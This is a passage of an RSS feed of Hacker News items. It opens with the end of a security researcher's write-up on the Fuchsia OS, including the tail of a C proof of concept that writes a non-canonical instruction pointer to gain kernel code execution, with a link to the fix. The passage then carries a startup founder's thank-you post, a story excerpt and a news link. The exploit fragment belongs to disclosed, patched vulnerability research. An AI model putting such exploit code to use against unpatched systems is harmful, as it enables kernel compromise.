        &lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00FFFFFFFFFFFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* A non-canonical address */&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zx_thread_write_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MyThreadHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ZX_THREAD_STATE_GENERAL_REGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZX_OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[Main] zx_thread_write_state failed: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;Resume&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;zx_handle_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* The thread resumes */&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;pthread_join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;thid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[Main] Survived! Exploit failed?!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With it, we are able to gain kernel code execution from a regular userland process.&lt;/p&gt;
&lt;p&gt;Fix: &lt;a class=&quot;reference external&quot; href=&quot;https://fuchsia.googlesource.com/fuchsia/+/0054a8a1162c2ea857fb02553835b804ead7b124&quot;&gt;[zircon][debugger] Disallow setting non-canonical rip addresses&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;others&quot; readability=&quot;7.8550247116969&quot;&gt;
&lt;h3&gt;Others&lt;/h3&gt;
&lt;p&gt;Some other uninteresting bugs were found, such as:&lt;/p&gt;
&lt;ul class=&quot;simple&quot;&gt;&lt;li&gt;Divisions by zero in USB drivers, which would only kill the USB user process with no effect on the kernel and components;&lt;/li&gt;
&lt;li&gt;kernel stack info leaks caused by lack of initialization on structures copied to userland, which are actually mitigated by &lt;a class=&quot;reference external&quot; href=&quot;https://reviews.llvm.org/D54604&quot;&gt;AutoVarInit&lt;/a&gt;, a compiler feature that initializes buffers automatically;&lt;/li&gt;
&lt;li&gt;out-of-bounds accesses in the Bluetooth stack, which are mitigated by sanity checks within &lt;tt class=&quot;docutils literal&quot;&gt;C++&lt;/tt&gt; methods and operators; and&lt;/li&gt;
&lt;li&gt;bluetooth DoSes where an attacker could use up the component's memory, but again without affecting the kernel.&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;conclusion&quot; readability=&quot;36&quot;&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Overall, Fuchsia exhibits interesting security properties compared to other OSes such as Android.&lt;/p&gt;
&lt;p&gt;A few days of vulnerability research allowed us to conclude that the common programming bugs found in other OSes can also be found in Fuchsia. However, while these bugs can often be considered as vulnerabilities in other OSes, they turn out to be uninteresting on Fuchsia, because their impact is, for the most part, mitigated by Fuchsia's security properties.&lt;/p&gt;
&lt;p&gt;We note however that these security properties do not - and in fact, cannot - hold in the lowest layers of the kernel related to virtualization, exception handling and scheduling, and that any bug here remains exploitable just like on any other OS.&lt;/p&gt;
&lt;p&gt;All the bugs we found were reported to Google, and are now fixed.&lt;/p&gt;
&lt;p&gt;Again, it is not clear where Fuchsia is heading, and whether it is just a research OS as Google claims or a real OS that is vowed to be used on future products. What's clear, though, is that it has the potential to significantly increase the difficulty for attackers to compromise devices.&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Tue, 09 Jun 2020 13:42:49 +0000</pubDate>
<dc:creator>tapper</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html</dc:identifier>
</item>
<item>
<title>Thank HN: My startup was born here and is now 10 years old</title>
<link>https://news.ycombinator.com/item?id=23466470</link>
<guid isPermaLink="true" >https://news.ycombinator.com/item?id=23466470</guid>
<description>Hello HN,
&lt;p&gt;I'm Paras Chopra, founder of VWO. We're an A/B testing platform that was born here as a Show HN in 2009.&lt;/p&gt;&lt;p&gt;As a 22 year old fresh out of college, I had launched an early prototype of a marketing platform in 2009 here, got initial users from HN (including patio11) who gave their feedback that my product was trying to do too many things. Their inputs are what that led me to focusing on one thing (A/B testing) and that's how I built and launched &quot;Visual Website Optimizer&quot;(now called VWO). Here's that Show HN thread from 2009: &lt;a href=&quot;https://news.ycombinator.com/item?id=876141&quot; rel=&quot;nofollow&quot;&gt;https://news.ycombinator.com/item?id=876141&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I can't thank this community enough - without Hacker News, VWO wouldn't have existed. Today, we're a team of 250+ people and seen that initial &quot;Show HN&quot; grow into a $20mn+ bootstrapped business (no VC funding). If anyone's interested in reading more, I've blogged this journey (from launch to now) on our website: &lt;a href=&quot;https://vwo.com/blog/vwo-evolution-10-years/&quot; rel=&quot;nofollow&quot;&gt;https://vwo.com/blog/vwo-evolution-10-years/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For any early stage entrepreneurs / indie hackers reading this, I'm sharing my story to let you know that you don't need connections, funding or breakthroughs to build a successful business. All you need is a hunger to make it happen and a community (like this one) to give you honest feedback for iterating on your product. If you are what Paul Graham calls as relentless resourceful, you will build a successful business.&lt;/p&gt;
&lt;p&gt;So, thank you HN! Thanks @patio11 for your feedback and initial shoutouts in 2009. And thanks Paul. Beyond YC funding, you've impacted lives of many other folks (like me) through your essays and by making Hn happen.&lt;/p&gt;
&lt;p&gt;PS: I don't know if this post will get any attention on HN today, but I felt like I had to do this :)&lt;/p&gt;
</description>
<pubDate>Tue, 09 Jun 2020 13:28:03 +0000</pubDate>
<dc:creator>paraschopra</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://news.ycombinator.com/item?id=23466470</dc:identifier>
</item>
<item>
<title>Receiving images of Earth from satellites with software defined radio</title>
<link>https://l-o-o-s-e-d.net/signs-of-life</link>
<guid isPermaLink="true" >https://l-o-o-s-e-d.net/signs-of-life</guid>
<description>He can’t talk to anybody, can’t check Facebook, can’t even check his cellphone to ﬁnd out what’s happening... He remembered a little portable radio that he kept by his bedside. So he carries a candle into his room, sets it down on the side table, sits on his bed, and ﬂips on the radio...&lt;p&gt;It doesn’t turn on either! I think at that point he realized something strange was happening; but he was so tired and aggravated at that point I think he just dismissed it all. He was on his bed then, and he just fell back across the middle and laid there. He was thinking about the call then.&lt;/p&gt;&lt;p&gt;It was Saturday the next day— he had fallen asleep. He told me he woke up to the radio playing— it was the Christmas station, I think. He shut it oﬀ, and found that all the lights in the house were back on again; but his cellphone was still dead. He plugged it in, and turned oﬀ the lights— the sun was coming in through the windows at that point; and he made a pot of coffee. He got a good amount of sleep— said he felt well-rested. I asked about the candles— said he should be careful falling asleep with something burning.&lt;/p&gt;&lt;p&gt;I think he had just ﬁnished breakfast around 10 in the morning. He pulled his laptop out at the kitchen table and was checking his email. There was something from his supervisor at the office, a few things to have ready for Monday. He tells me these things— he didn’t really have anyone to talk to there; so he had to tell me every little detail about his day anytime we got on the phone.&lt;/p&gt;&lt;p&gt;Anyways, he says he’s responding to somebody at work about some project deadline, or something, happening later that week— and it happens again! Same as before, he’s ﬁnishing up his email and *pop*, his laptop screen freezes, glitches out, and fades black. He stands up, goes over to the wall, ﬂips the light switch up and down, up and down— nothing. It’s the middle of the day, so he can’t just sleep through the outage like he did before. It was some kind of surge too, so the battery didn’t seem to have any charge.&lt;/p&gt;&lt;p&gt;He calls the power company, but they seem as clueless as he did. So, he went out on his front porch— sipping his second cup of coﬀee; and he just sat there. He had his car— he could have come to my house or run a few errands... but I guess he didn’t really have anything he needed to buy.&lt;/p&gt;&lt;p&gt;So he just sat on this old wooden bench he has, on his front porch, sipping his coﬀee. He said it was the ﬁrst time he’d had a moment to just SIT. He told me how much he enjoyed himself— it was an unusually nice day for December. He just sat there, watched the leaves scratch along the sidewalk, heard the neighborhood children— laughing and playing, dogs barking, the cars going by, saw the clouds moving overhead, and just sat there— taking it in.&lt;/p&gt;&lt;p&gt;He ﬁnished his coﬀee, but stayed seated on his bench and just breathed the air for hours. Eventually he went back inside— at that point the power was back on. It might have been on for a while, but he had lost track of time. He sounded a bit odd when he told me about it... like he had something else to say. But that’s all he told me.&lt;/p&gt;</description>
<pubDate>Tue, 09 Jun 2020 12:02:12 +0000</pubDate>
<dc:creator>l00sed</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://l-o-o-s-e-d.net/signs-of-life</dc:identifier>
</item>
<item>
<title>Apple Plans to Announce Move to Its Own Mac Chips at WWDC</title>
<link>https://www.bloomberg.com/news/articles/2020-06-09/apple-plans-to-announce-move-to-its-own-mac-chips-at-wwdc</link>
<guid isPermaLink="true" >https://www.bloomberg.com/news/articles/2020-06-09/apple-plans-to-announce-move-to-its-own-mac-chips-at-wwdc</guid>
<description>[unable to retrieve full-text content]
&lt;p&gt;Article URL: &lt;a href=&quot;https://www.bloomberg.com/news/articles/2020-06-09/apple-plans-to-announce-move-to-its-own-mac-chips-at-wwdc&quot;&gt;https://www.bloomberg.com/news/articles/2020-06-09/apple-plans-to-announce-move-to-its-own-mac-chips-at-wwdc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=23465364&quot;&gt;https://news.ycombinator.com/item?id=23465364&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Points: 299&lt;/p&gt;
&lt;p&gt;# Comments: 335&lt;/p&gt;
</description>
<pubDate>Tue, 09 Jun 2020 10:33:22 +0000</pubDate>
<dc:creator>sleepyshift</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.bloomberg.com/tosv2.html?vid=&amp;uuid=f437c6c0-aab5-11ea-a667-bb396fbbdbd9&amp;url=L25ld3MvYXJ0aWNsZXMvMjAyMC0wNi0wOS9hcHBsZS1wbGFucy10by1hbm5vdW5jZS1tb3ZlLXRvLWl0cy1vd24tbWFjLWNoaXBzLWF0LXd3ZGM=</dc:identifier>
</item>
</channel>
</rss>